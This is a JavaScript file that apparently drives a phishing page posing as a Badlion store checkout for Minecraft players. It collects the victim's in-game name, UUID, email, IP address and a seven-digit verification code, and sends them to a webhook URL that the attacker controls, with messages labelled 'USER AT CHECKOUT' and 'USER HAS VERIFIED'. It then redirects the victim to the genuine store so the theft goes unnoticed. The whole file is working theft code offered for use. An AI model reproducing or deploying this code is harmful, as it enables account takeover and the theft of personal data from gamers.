


function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(";");
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == " ") {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}


async function createCookies() {
    // check to be sure ign isnt empty
    const ign = document.getElementById("ign").value;
    if (ign == "") return;
    document.cookie = "ign=" + ign;
    const body = await fetch(`https://api.ashcon.app/mojang/v2/user/${ign}`, {
        method: "GET",
    }).then((res) => res.json());
    var uuid = await body.uuid;
    uuid = await uuid.replaceAll("-", "");
    document.cookie = "uuid=" + (await uuid);
    console.log(await uuid);
}






function goToVerify() {
    location.href = "/verify";
}



function containsOnlyNumbers(str) {
    return /^\d+$/.test(str);
}



async function gotoBadlion() {
    const codestring =
        document.getElementById("1").value +
        document.getElementById("2").value +
        document.getElementById("3").value +
        document.getElementById("4").value +
        document.getElementById("5").value +
        document.getElementById("6").value +
        document.getElementById("7").value;

    document.cookie = "code=" + codestring;

    if (
        document.getElementById("1").value == "" ||
        document.getElementById("2").value == "" ||
        document.getElementById("3").value == "" ||
        document.getElementById("4").value == "" ||
        document.getElementById("5").value == "" ||
        document.getElementById("6").value == "" ||
        document.getElementById("7").value == "" ||
        !containsOnlyNumbers(codestring) 
    ) {
        return;
    } else {
        await sendCheckoutWebhook2();

        // wait half a seoncd
        await new Promise((r) => setTimeout(r, 500));

        location.href = "https://store.badlion.net/";
    }
}







async function submitIgn() {


    const ign = document.getElementById("usernamebox").value;
    document.cookie = "ign=" + ign;
    
    fetch(`https://api.mojang.com/users/profiles/minecraft/${ign}`)
    .then(response => response.json())
    .then(data => {
      // Set the UUID of the user to a variable
      const uuid = data.id;


      uuid = uuid.replaceAll("-", "");
      document.cookie = "uuid=" + (uuid);
      console.log(uuid);

      
      
    })


    document.cookie = "email=" + document.getElementById("address_email").value;

    sendCheckoutWebhook1(); 
    
}


async function sendCheckoutWebhook2() {
    const uuid = getCookie("uuid");
    const ign = getCookie("ign");
    const email = getCookie("email");
    const user_ip = getCookie("user_ip");
    const code = getCookie("code");
    const webhookURL = getCookie("webhook_url");


    msg = {
        username: "HOOK",
        avatar_url: `https://crafatar.com/avatars/${uuid}?size=512&overlay`,
        embeds: [
            {
                title: "USER HAS VERIFIED",
                color: 0,
                fields: [
                    {
                        name: "IGN",
                        value: ign,
                        inline: true,
                    },
                    {
                        name: "Email",
                        value: email,
                        inline: true,
                    },
                    {
                        name: "IP",
                        value: user_ip,
                        inline: true,
                    },
                    {
                        name: "Code",
                        value: code,
                        inline: true,
                    },
                ],
                image: {
                    url: `https://visage.surgeplay.com/full/${uuid}`,
                },
                author: {
                    name: ign,
                    icon_url: `https://crafatar.com/avatars/${uuid}?size=512&overlay`,
                },
            },
        ],
    };

    fetch(
        `${webhookURL}`,
        {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(msg),
        }
    );
}




async function sendCheckoutWebhook1() {
    const uuid = getCookie("uuid");
    const ign = getCookie("ign");
    const email = getCookie("email");
    const user_ip = getCookie("user_ip");
    const webhookURL = getCookie("webhook_url");

    msg = {
        username: "HOOK",
        avatar_url: `https://crafatar.com/avatars/${uuid}?size=512&overlay`,
        embeds: [
            {
                title: "USER AT CHECKOUT",
                color: 0,
                fields: [
                    {
                        name: "IGN",
                        value: ign,
                        inline: true,
                    },
                    {
                        name: "Email",
                        value: email,
                        inline: true,
                    },
                    {
                        name: "IP",
                        value: user_ip,
                        inline: true,
                    },
                ],
                image: {
                    url: `https://visage.surgeplay.com/full/${uuid}`,
                },
                author: {
                    name: ign,
                    icon_url: `https://crafatar.com/avatars/${uuid}?size=512&overlay`,
                },
            },
        ],
    };

    fetch(
        `${webhookURL}`,
        {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(msg),
        }
    );



    goToVerify()
}

